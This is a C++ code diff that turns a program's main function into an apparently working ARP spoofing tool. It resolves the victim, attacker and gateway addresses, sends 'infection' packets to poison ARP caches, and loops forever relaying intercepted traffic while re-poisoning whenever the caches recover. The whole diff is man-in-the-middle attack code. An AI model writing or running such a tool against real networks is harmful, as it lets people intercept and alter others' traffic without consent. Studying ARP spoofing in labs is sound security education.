@@ -12,26 +12,53 @@ int main(int argc, char **argv){
 	}
 
 	try{
-		Netssn::Session ses;
-		ses.open_session();
+		Netssn::Session ses(256);
+		string aip, amac;
+		string vip=argv[1], vmac;
+		string gip, gmac;
+		int fcount=0;
+		while(!Netssn::convert_ip2mac(vip, vmac)){
+			fcount++;
+			if(fcount >= 4)throw NetException("Given IP is not accessable.");
+		}
+		fcount=0;
+		while(!Netssn::get_my_config(vip, aip, amac)){
+			fcount++;
+			if(fcount >= 4)throw NetException("Given IP is not accessable.");
+		}
+		if(!Netssn::get_gateway_IP(vip, gip))throw NetException("Gateway not Found");
+		fcount=0;
+		while(!Netssn::convert_ip2mac(gip, gmac)){
+			fcount++;
+			if(fcount >= 4)throw NetException("Given IP is not accessable.");
+		}
+		printf("Attacker : IP=%s, MAC=%s\n", aip.c_str(), amac.c_str());
+		printf(" Victim  : IP=%s, MAC=%s\n", vip.c_str(), vmac.c_str());
+		printf("Gateway  : IP=%s, MAC=%s\n", gip.c_str(), gmac.c_str());
+		
+		ses.set_config(aip, amac, gip, gmac, vip, vmac);
+
+		ses.send_infection();
+		puts("\n------ ARP Spoofing Start ------\n");
+		while(1){
+			Packet packet;
+			ses.catch_packet(packet);
+			
+			if(ses.is_recover_packet(packet)){
+				puts("ARP Recovery Detected");
+				ses.send_infection();
+			}
+			if(int rtyp = ses.relay_packet(packet)){
+				if(rtyp == 1)puts("IP - Victim Sent a Packet");
+				if(rtyp == 2)puts("IP - Gateway Sent a Packet");
+			}
+	//		if(packet.pdu()->find_pdu<IP>())
+	//			cout << "IP : " << packet.pdu()->rfind_pdu<IP>().src_addr() << endl;
+		}
 	}
 	catch(exception &e){
 		printf("Error: %s\n", e.what());
 	}
-/*
-	int vic[4], gtw[4];
-	if(sscanf(argv[1], "%d.%d.%d.%d", &vic[0], &vic[1], &vic[2], &vic[3]) != 4){
-		puts("Invalid IP Type.");
-		return 1;
-	}
-	if(getGatewayIP(gtw) < 0){
-		puts("Failed to get Gateway's IP.");
-		return 1;
-	}
-
-	sendFakePacket(vic, gtw);*/
-
-//	opendevice(BUFSIZ, 0, argv[1]);
 	return 0;
 }
 
